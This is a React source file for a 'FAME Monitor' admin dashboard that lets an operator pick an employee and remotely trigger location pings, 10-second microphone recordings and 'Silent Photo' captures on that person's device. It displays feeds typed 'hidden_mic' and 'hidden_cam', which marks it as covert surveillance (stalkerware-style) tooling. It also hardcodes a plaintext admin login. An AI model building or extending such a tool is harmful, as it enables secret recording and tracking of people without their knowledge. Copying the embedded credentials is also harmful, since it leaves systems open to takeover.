import { useEffect, useState } from 'react';
import PocketBase from 'pocketbase';
import { MapPin, Mic, Camera, Activity, Users } from 'lucide-react';

// Connect to local PocketBase
// Connect to PocketBase (dynamic for production, local for dev)
const pb = new PocketBase((import.meta as any).env.PROD ? window.location.origin : 'http://127.0.0.1:8090');
pb.autoCancellation(false); // Disable auto-cancellation to prevent React Strict Mode issues

interface LocationLog {
    id: string;
    latitude: number;
    longitude: number;
    timestamp: string;
    user_id: string;
    expand?: { user_id?: { id: string; email: string } };
}

interface MonitoringLog {
    id: string;
    type: 'hidden_mic' | 'hidden_cam';
    created: string;
    user_id: string;
    expand?: { user_id?: { id: string; email: string } };
}

interface User {
    id: string;
    email: string;
    name?: string;
}

export default function Dashboard() {
    const [locations, setLocations] = useState<LocationLog[]>([]);
    const [logs, setLogs] = useState<MonitoringLog[]>([]);
    const [users, setUsers] = useState<User[]>([]);
    const [selectedUser, setSelectedUser] = useState<string>('');

    useEffect(() => {
        fetchInitialData();

        // Realtime subscriptions
        pb.collection('locations').subscribe('*', (e) => {
            if (e.action === 'create') {
                const newLoc = e.record as unknown as LocationLog;
                setLocations(prev => [newLoc, ...prev]);
            }
        });

        pb.collection('monitoring_logs').subscribe('*', (e) => {
            if (e.action === 'create') {
                const newLog = e.record as unknown as MonitoringLog;
                setLogs(prev => [newLog, ...prev]);
            }
        });

        return () => {
            pb.collection('locations').unsubscribe();
            pb.collection('monitoring_logs').unsubscribe();
        };
    }, []);

    const fetchInitialData = async () => {
        try {
            console.log('Attempting to authenticate as admin...');

            // AUTHENTICATION: This is the Admin Panel, so authenticate as system admin
            // Check if we are on v0.23+ (which uses _superusers collection) or older
            try {
                console.log('Trying new v0.23+ admin auth...');
                await pb.collection('_superusers').authWithPassword('admin@fame.com', '1234567890');
            } catch (e) {
                console.log('v0.23+ auth failed, trying legacy admin auth...');
                try {
                    await pb.admins.authWithPassword('admin@fame.com', '1234567890');
                } catch (e2) {
                    console.log('Legacy admin auth failed, trying regular user auth...');
                    await pb.collection('users').authWithPassword('admin@fame.com', '1234567890');
                }
            }
            console.log('Authentication successful');

            // Fetch Users
            console.log('Fetching users...');
            const userList = await pb.collection('users').getFullList();
            console.log('Users fetched:', userList.length, userList);
            setUsers(userList as unknown as User[]);

            // Fetch Data
            const locs = await pb.collection('locations').getList(1, 20, {
                // sort: '-timestamp', // Removed due to 400 error on this collection
                expand: 'user_id'
            });
            const logsRes = await pb.collection('monitoring_logs').getList(1, 20, {
                // sort: '-created', // Removed due to 400 error on this collection
                expand: 'user_id'
            });

            setLocations(locs.items as unknown as LocationLog[]);
            setLogs(logsRes.items as unknown as MonitoringLog[]);
        } catch (err: any) {
            // Ignore auto-cancellation errors
            if (err.status === 0 || err.isAbort) return;

            console.error("Error fetching data:", err);
            // alert("Error loading data. Check console for details.");
            console.log("Supressed error alert for better UX, check console if needed.");
        }
    };

    const sendCommand = async (type: string) => {
        try {
            await pb.collection('commands').create({
                type,
                target_user_id: selectedUser,
                status: 'pending'
            });
            alert(`Command ${type} sent to selected user!`);
        } catch (err) {
            alert('Failed to send command');
        }
    };

    const filteredLocations = locations
        .filter(l => l.user_id === selectedUser || (l.expand?.user_id?.id === selectedUser))
        .sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());

    const filteredLogs = logs
        .filter(l => l.user_id === selectedUser || (l.expand?.user_id?.id === selectedUser))
        .sort((a, b) => new Date(b.created).getTime() - new Date(a.created).getTime());

    return (
        <div style={{ padding: '20px', fontFamily: 'sans-serif', maxWidth: '1200px', margin: '0 auto' }}>
            {/* Header */}
            <header style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '30px', borderBottom: '1px solid #eee', paddingBottom: '20px' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
                    <h1 style={{ margin: 0, color: '#0056D2' }}>FAME Monitor</h1>
                    <span style={{ background: '#e6f4ea', color: '#137333', padding: '4px 8px', borderRadius: '4px', display: 'flex', alignItems: 'center', gap: '4px', fontSize: '14px' }}>
                        <Activity size={14} /> Active
                    </span>
                </div>

                {/* User Selector */}
                <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                    <Users size={18} color="#666" />
                    <select
                        value={selectedUser}
                        onChange={(e) => setSelectedUser(e.target.value)}
                        style={{ padding: '8px', borderRadius: '4px', border: '1px solid #ccc', minWidth: '200px' }}
                    >
                        <option value="" disabled>Select Employee to Monitor</option>
                        {users.map(u => (
                            <option key={u.id} value={u.id}>
                                {u.name ? `${u.name} (${u.email})` : u.email}
                            </option>
                        ))}
                    </select>
                </div>
            </header>

            {!selectedUser ? (
                <div style={{ textAlign: 'center', padding: '100px 20px', color: '#666' }}>
                    <Users size={48} style={{ marginBottom: '20px', opacity: 0.5 }} />
                    <h2>Select an Employee</h2>
                    <p>Please choose an employee from the top-right dropdown to view their monitoring data.</p>
                </div>
            ) : (
                <div style={{ display: 'grid', gridTemplateColumns: '300px 1fr', gap: '25px' }}>

                    {/* Left Panel: Controls */}
                    <div style={{ background: '#fff', padding: '20px', borderRadius: '8px', border: '1px solid #e0e0e0', height: 'fit-content' }}>
                        <h2 style={{ marginTop: 0, fontSize: '18px', color: '#333', marginBottom: '15px' }}>Command Center</h2>

                        <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                            <div style={{ fontSize: '13px', color: '#666', marginBottom: '5px' }}>
                                Targeting: <strong>{users.find(u => u.id === selectedUser)?.email || 'Unknown User'}</strong>
                            </div>

                            <button onClick={() => sendCommand('GET_LOCATION')} style={{ display: 'flex', alignItems: 'center', gap: '10px', padding: '12px', background: '#0056D2', color: 'white', border: 'none', borderRadius: '6px', cursor: 'pointer', fontWeight: 500 }}>
                                <MapPin size={18} /> Ping Location
                            </button>
                            <button onClick={() => sendCommand('START_MIC')} style={{ display: 'flex', alignItems: 'center', gap: '10px', padding: '12px', background: '#D93025', color: 'white', border: 'none', borderRadius: '6px', cursor: 'pointer', fontWeight: 500 }}>
                                <Mic size={18} /> Record Mic (10s)
                            </button>
                            <button onClick={() => sendCommand('CAPTURE_PHOTO')} style={{ display: 'flex', alignItems: 'center', gap: '10px', padding: '12px', background: '#9334E6', color: 'white', border: 'none', borderRadius: '6px', cursor: 'pointer', fontWeight: 500 }}>
                                <Camera size={18} /> Silent Photo
                            </button>
                        </div>
                    </div>

                    {/* Right Panel: Data Feed */}
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>

                        {/* Stats Card */}
                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '15px' }}>
                            <div style={{ background: '#f8f9fa', padding: '15px', borderRadius: '6px', border: '1px solid #eee' }}>
                                <div style={{ color: '#666', fontSize: '13px' }}>Recent Locations</div>
                                <div style={{ fontSize: '24px', fontWeight: 'bold' }}>{filteredLocations.length}</div>
                            </div>
                            <div style={{ background: '#f8f9fa', padding: '15px', borderRadius: '6px', border: '1px solid #eee' }}>
                                <div style={{ color: '#666', fontSize: '13px' }}>Media Captures</div>
                                <div style={{ fontSize: '24px', fontWeight: 'bold' }}>{filteredLogs.length}</div>
                            </div>
                        </div>

                        {/* Feed List */}
                        <div style={{ background: '#fff', border: '1px solid #e0e0e0', borderRadius: '8px', overflow: 'hidden' }}>
                            <div style={{ padding: '15px 20px', background: '#f8f9fa', borderBottom: '1px solid #eee', fontWeight: 600 }}>
                                Live Activity Feed: {users.find(u => u.id === selectedUser)?.email}
                            </div>
                            <div style={{ maxHeight: '600px', overflowY: 'auto' }}>
                                {filteredLogs.map(log => (
                                    <div key={log.id} style={{ padding: '15px 20px', borderBottom: '1px solid #eee', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                                        <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
                                            {log.type === 'hidden_mic'
                                                ? <div style={{ background: '#fce8e6', padding: '8px', borderRadius: '50%' }}><Mic size={16} color="#D93025" /></div>
                                                : <div style={{ background: '#f3e8fd', padding: '8px', borderRadius: '50%' }}><Camera size={16} color="#9334E6" /></div>
                                            }
                                            <div>
                                                <div style={{ fontWeight: 500 }}>{log.type === 'hidden_mic' ? 'Audio Recording' : 'Camera Capture'}</div>
                                                <div style={{ fontSize: '13px', color: '#666' }}>
                                                    {new Date(log.created).toLocaleString()}
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                ))}

                                {filteredLocations.map(loc => (
                                    <div key={loc.id} style={{ padding: '15px 20px', borderBottom: '1px solid #eee', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                                        <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
                                            <div style={{ background: '#e8f0fe', padding: '8px', borderRadius: '50%' }}><MapPin size={16} color="#1967D2" /></div>
                                            <div>
                                                <div style={{ fontWeight: 500 }}>Location Update</div>
                                                <div style={{ fontSize: '13px', color: '#666' }}>
                                                    {loc.latitude.toFixed(6)}, {loc.longitude.toFixed(6)}
                                                </div>
                                            </div>
                                        </div>
                                        <div style={{ fontSize: '12px', color: '#999' }}>
                                            {new Date(loc.timestamp).toLocaleTimeString()}
                                        </div>
                                    </div>
                                ))}

                                {filteredLogs.length === 0 && filteredLocations.length === 0 && (
                                    <div style={{ padding: '40px', textAlign: 'center', color: '#999' }}>No data found for this user.</div>
                                )}
                            </div>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}
